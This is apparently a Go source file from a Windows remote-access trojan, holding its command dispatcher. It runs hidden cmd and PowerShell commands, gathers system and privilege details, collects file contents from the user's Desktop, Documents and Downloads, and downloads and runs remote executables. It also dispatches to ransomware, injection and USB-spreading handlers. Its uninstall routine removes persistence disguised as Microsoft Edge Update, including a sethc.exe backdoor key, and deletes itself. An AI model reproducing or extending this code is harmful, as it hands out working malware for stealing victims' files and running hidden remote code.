package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// dispatch 指令分发，任何一条失败都不影响主循环
func dispatch(t task) (out []byte, ok bool) {
	defer func() {
		if r := recover(); r != nil {
			out = []byte(fmt.Sprintf("panic: %v", r))
			ok = false
		}
	}()

	switch strings.ToLower(t.Cmd) {
	case "shell", "cmd", "exec":
		return runShell(t.Args)

	case "powershell", "ps":
		return runPowerShell(t.Args)

	case "info", "sysinfo":
		return sysInfo(), true

	case "loot":
		return collectLoot(t.Args)

	case "ls":
		return listDir(t.Args)

	case "cat", "read":
		b, err := os.ReadFile(t.Args)
		if err != nil {
			return []byte(err.Error()), false
		}
		return b, true

	case "put", "write":
		parts := strings.SplitN(t.Args, "::", 2)
		if len(parts) != 2 {
			return []byte("bad args, need path::base64"), false
		}
		b := decodeB64(parts[1])
		if err := os.WriteFile(parts[0], b, 0o644); err != nil {
			return []byte(err.Error()), false
		}
		return []byte("written " + parts[0]), true

	case "inject":
		return injectCmd(t.Args)

	case "ransom":
		return ransomCmd(t.Args)

	case "spread", "usb":
		return spreadCmd(t.Args)

	case "download_exec":
		return dlExec(t.Args)

	case "sleep":
		n, _ := strconv.Atoi(t.Args)
		if n > 0 {
			sleepSeconds(n)
		}
		return []byte("slept"), true

	case "uninstall":
		return uninstall(), true

	default:
		return []byte("unknown cmd: " + t.Cmd), false
	}
}

func runShell(cmdline string) ([]byte, bool) {
	c := exec.Command("cmd", "/c", cmdline)
	hideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil && len(out) == 0 {
		return []byte(err.Error()), false
	}
	return out, err == nil
}

func runPowerShell(cmdline string) ([]byte, bool) {
	c := exec.Command("powershell", "-NoP", "-NonI", "-W", "Hidden", "-C", cmdline)
	hideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil && len(out) == 0 {
		return []byte(err.Error()), false
	}
	return out, err == nil
}

func sysInfo() []byte {
	host, _ := os.Hostname()
	wd, _ := os.Getwd()
	var b strings.Builder
	b.WriteString("id=" + machine + "\n")
	b.WriteString("host=" + host + "\n")
	b.WriteString("user=" + os.Getenv("USERNAME") + "\n")
	b.WriteString("domain=" + os.Getenv("USERDOMAIN") + "\n")
	b.WriteString("os=" + runtime.GOOS + "/" + runtime.GOARCH + "\n")
	b.WriteString("cwd=" + wd + "\n")
	b.WriteString(fmt.Sprintf("cpu=%d mem=%.1fGB\n", runtimeNumCPU(), totalMemoryGB()))
	if isAdmin() {
		b.WriteString("priv=admin\n")
	} else {
		b.WriteString("priv=user\n")
	}
	b.WriteString("proc=" + os.Args[0] + "\n")
	b.WriteString("time=" + time.Now().Format(time.RFC3339) + "\n")
	return []byte(b.String())
}

// collectLoot 按通配收集文件，小文件回内容，大文件回元信息
func collectLoot(pattern string) ([]byte, bool) {
	if pattern == "" {
		pattern = "*.txt"
	}
	roots := []string{
		os.Getenv("USERPROFILE") + `\Desktop`,
		os.Getenv("USERPROFILE") + `\Documents`,
		os.Getenv("USERPROFILE") + `\Downloads`,
	}
	var b strings.Builder
	count := 0
	for _, root := range roots {
		filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
			if err != nil || info == nil || info.IsDir() {
				return nil
			}
			if count > 400 {
				return filepath.SkipAll
			}
			matched, _ := filepath.Match(pattern, filepath.Base(p))
			if !matched {
				return nil
			}
			count++
			b.WriteString(fmt.Sprintf("%s\t%d\n", p, info.Size()))
			if info.Size() < 96*1024 {
				if raw, err := os.ReadFile(p); err == nil {
					b.WriteString("---8<---\n")
					b.WriteString(string(raw))
					b.WriteString("\n--->8---\n")
				}
			}
			return nil
		})
	}
	if count == 0 {
		return []byte("no match: " + pattern), false
	}
	return []byte(b.String()), true
}

func listDir(dir string) ([]byte, bool) {
	if dir == "" {
		dir = "."
	}
	ents, err := os.ReadDir(dir)
	if err != nil {
		return []byte(err.Error()), false
	}
	var b strings.Builder
	for _, e := range ents {
		if e.IsDir() {
			b.WriteString("[D] " + e.Name() + "\n")
			continue
		}
		info, _ := e.Info()
		sz := int64(0)
		if info != nil {
			sz = info.Size()
		}
		b.WriteString(fmt.Sprintf("[F] %s\t%d\n", e.Name(), sz))
	}
	return []byte(b.String()), true
}

func dlExec(url string) ([]byte, bool) {
	raw, err := httpGet(url)
	if err != nil {
		return []byte(err.Error()), false
	}
	dst := filepath.Join(os.TempDir(), fmt.Sprintf("svc%x.exe", time.Now().UnixNano()))
	if err := os.WriteFile(dst, raw, 0o700); err != nil {
		return []byte(err.Error()), false
	}
	c := exec.Command(dst)
	hideWindow(c)
	if err := c.Start(); err != nil {
		return []byte(err.Error()), false
	}
	return []byte("spawned " + dst + " (" + strconv.Itoa(len(raw)) + " bytes)"), true
}

func uninstall() []byte {
	var b strings.Builder
	// 清注册表
	for _, k := range []string{
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`,
	} {
		runHidden("reg", "delete", k, "/v", "MicrosoftEdgeUpdate", "/f")
		runHidden("reg", "delete", k, "/v", "EdgeUpdateSvc", "/f")
		b.WriteString("cleaned " + k + "\n")
	}
	runHidden("schtasks", "/delete", "/tn", "MicrosoftEdgeUpdateTaskMachineCore", "/f")
	runHidden("schtasks", "/delete", "/tn", "MicrosoftEdgeUpdateTaskMachineUA", "/f")
	runHidden("sc", "delete", "EdgeUpdateSvc")
	runHidden("reg", "delete", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/f")
	b.WriteString("persistence removed\n")
	// 自删
	c := exec.Command("cmd", "/c", "ping 127.0.0.1 -n 3 >nul & del /f /q \""+os.Args[0]+"\"")
	hideWindow(c)
	_ = c.Start()
	b.WriteString("self-delete scheduled")
	go func() {
		time.Sleep(2 * time.Second)
		os.Exit(0)
	}()
	return []byte(b.String())
}
